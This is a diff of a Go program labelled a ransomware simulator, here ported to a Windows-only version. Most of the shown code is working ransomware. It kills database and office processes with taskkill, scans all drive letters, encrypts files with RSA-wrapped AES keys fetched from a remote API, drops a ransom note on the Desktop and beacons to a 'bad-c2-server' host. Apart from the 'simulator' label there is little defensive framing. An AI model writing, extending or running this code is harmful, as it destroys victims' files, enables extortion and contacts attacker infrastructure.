@@ -1,3 +1,4 @@
+// ransom_simulator_windows.go - Windows专用版本
 package main
 
 import (
@@ -24,14 +25,12 @@ import (
 	"time"
 )
 
-// --- 勒索软件特征常量 ---
 const (
-	version   = "v2.7-Beta" // 版本更新，代表最终加固
+	version   = "v2.7-Beta-Windows"
 	apiURL    = "https://rsa-uuid.api.yangzifun.org"
 	beaconURL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"
 )
 
-// --- 默认回退配置 ---
 const (
 	defaultUUID      = "5137d4c3-3901-4528-bfa9-6d9ce88fa287"
 	defaultPublicKey = `-----BEGIN PUBLIC KEY-----
@@ -45,7 +44,6 @@ tQIDAQAB
 -----END PUBLIC KEY-----`
 )
 
-// --- 勒索信内容 ---
 const ransomNoteContent = `
 ================================================================================
    !!! ATTENTION: YOUR FILES ARE ENCRYPTED / 注意：您的文件已被加密 !!!
@@ -133,13 +131,6 @@ var (
 		"mspaint.exe", "sqlservr.exe", "mysqld.exe", "oracle.exe", "outlook.exe",
 		"thunderbird.exe", "steam.exe", "code.exe",
 	}
-	targetProcessesLinux = []string{
-		"gedit", "vim", "nano", "mysqld", "postgres", "mongod",
-	}
-	excludedDirsLinux = []string{
-		"/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc", "/run", "/sbin", "/sys", "/usr", "/var",
-		"/tmp", "/lost+found", "/Applications", "/Library", "/System", "/private",
-	}
 	excludedDirsWindows = []string{
 		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
 		"System Volume Information", "$Recycle.Bin",
@@ -174,7 +165,7 @@ func main() {
 	forceReleaseLock()
 
 	fmt.Println("==================================================")
-	fmt.Println("      勒索软件模拟器 - 攻击已启动")
+	fmt.Println("      勒索软件模拟器 - Windows版本")
 	fmt.Printf("                版本: %s\n", version)
 	fmt.Println("==================================================")
 	time.Sleep(1 * time.Second)
@@ -267,12 +258,11 @@ func main() {
 
 	if !*dryRunFlag {
 		fmt.Println("\n[阶段 4: 勒索信增强]")
-		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID)
-		if runtime.GOOS == "linux" {
-			desktopPath := getLinuxDesktopPath()
-			if desktopPath != "" {
-				_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
-			}
+		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID, finalUUID)
+		userProfile, err := os.UserHomeDir()
+		if err == nil {
+			desktopPath := filepath.Join(userProfile, "Desktop")
+			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
 		}
 		createRansomWallpaper()
 	}
@@ -292,20 +282,8 @@ func main() {
 
 func killLockingProcesses() {
 	fmt.Println("[*] 正在尝试释放文件句柄 (结束占用进程)...")
-	var targets []string
-	if runtime.GOOS == "windows" {
-		targets = targetProcessesWindows
-	} else {
-		targets = targetProcessesLinux
-	}
-
-	for _, proc := range targets {
-		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("taskkill", "/F", "/IM", proc)
-		} else {
-			cmd = exec.Command("pkill", "-9", "-f", proc)
-		}
+	for _, proc := range targetProcessesWindows {
+		cmd := exec.Command("taskkill", "/F", "/IM", proc)
 		_ = cmd.Run()
 	}
 	time.Sleep(1 * time.Second)
@@ -368,15 +346,13 @@ func countdown(message string, seconds int) {
 	fmt.Println("\r程序已退出。                                  ")
 }
 
-// networkBeacon 修复了资源泄漏问题
 func networkBeacon() {
 	time.Sleep(3 * time.Second)
 	client := http.Client{Timeout: 5 * time.Second}
 	resp, err := client.Get(beaconURL)
 	if err != nil {
-		return // 网络错误，无 Body 可关闭
+		return
 	}
-	// 无论如何，只要请求成功，就必须关闭 Body
 	defer func() { _ = resp.Body.Close() }()
 }
 
@@ -388,22 +364,8 @@ func simulateDestructiveActions() {
 	time.Sleep(1 * time.Second)
 }
 
-func getLinuxDesktopPath() string {
-	home, err := os.UserHomeDir()
-	if err != nil {
-		return ""
-	}
-	possibleDirs := []string{filepath.Join(home, "Desktop"), filepath.Join(home, "桌面"), home}
-	for _, dir := range possibleDirs {
-		if _, err := os.Stat(dir); err == nil {
-			return dir
-		}
-	}
-	return home
-}
-
 func createRansomWallpaper() {
-	// 实际壁纸修改逻辑...
+	fmt.Println("[*] Windows壁纸修改功能(模拟)")
 }
 
 func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
@@ -412,15 +374,11 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 	if len(scanRoots) > 0 {
 		roots = scanRoots
 	} else {
-		if runtime.GOOS == "windows" {
-			for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
-				drivePath := string(drive) + ":\\"
-				if _, err := os.Stat(drivePath); err == nil {
-					roots = append(roots, drivePath)
-				}
+		for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
+			drivePath := string(drive) + ":\\"
+			if _, err := os.Stat(drivePath); err == nil {
+				roots = append(roots, drivePath)
 			}
-		} else {
-			roots = []string{"/"}
 		}
 	}
 	for _, root := range roots {
@@ -469,7 +427,7 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	}
 	*outUUID = resp.UUID
 
-	finalAccurateNote := fmt.Sprintf(ransomNoteContent, resp.UUID, resp.UUID)
+	finalAccurateNote := fmt.Sprintf(ransomNoteContent, resp.UUID, resp.UUID, resp.UUID)
 	var visitedDirs sync.Map
 
 	log, err := newFileLog("ransom_log.txt")
@@ -532,17 +490,12 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 }
 
 func fetchKeysFromAPI() (*APIResponse, error) {
-	// 修复点 1: 创建一个空的 JSON Body "{}"
-	// 服务器可能无法接受 POST 请求的 Body 为 nil
 	jsonBody := []byte("{}")
 	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
 	if err != nil {
 		return nil, fmt.Errorf("创建请求失败: %w", err)
 	}
-	// 保持原有的 User-Agent
 	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)
-
-	// 修复点 2: 显式设置 Content-Type 防止 412/415 错误
 	req.Header.Set("Content-Type", "application/json")
 	client := &http.Client{Timeout: 5 * time.Second}
 	res, err := client.Do(req)
@@ -551,7 +504,6 @@ func fetchKeysFromAPI() (*APIResponse, error) {
 	}
 	defer func() { _ = res.Body.Close() }()
 	if res.StatusCode != http.StatusOK {
-		// 增加调试信息，如果还报错可以看到具体原因
 		body, _ := io.ReadAll(res.Body)
 		return nil, fmt.Errorf("API返回异常状态码: %d, Body: %s", res.StatusCode, string(body))
 	}
@@ -570,16 +522,10 @@ func fetchKeysFromAPI() (*APIResponse, error) {
 }
 
 func isExcluded(path string) bool {
-	pathLower := strings.ToLower(path)
-	var excludeList []string
-	if runtime.GOOS == "windows" {
-		excludeList = excludedDirsWindows
-	} else {
-		excludeList = excludedDirsLinux
-	}
-	for _, ex := range excludeList {
-		exLower := strings.ToLower(ex)
-		if pathLower == exLower || strings.HasPrefix(pathLower, exLower+string(filepath.Separator)) {
+	pathLower := strings.ToLower(filepath.ToSlash(path))
+	for _, ex := range excludedDirsWindows {
+		exLower := strings.ToLower(filepath.ToSlash(ex))
+		if pathLower == exLower || strings.HasPrefix(pathLower, exLower+"/") {
 			return true
 		}
 	}
@@ -672,7 +618,6 @@ func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
 		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
 	}
 
-	// 最终文件结构: [Encrypted AES Key] + [Nonce] + [File Ciphertext]
 	var buffer bytes.Buffer
 	buffer.Write(encryptedAESKey)
 	buffer.Write(nonce)
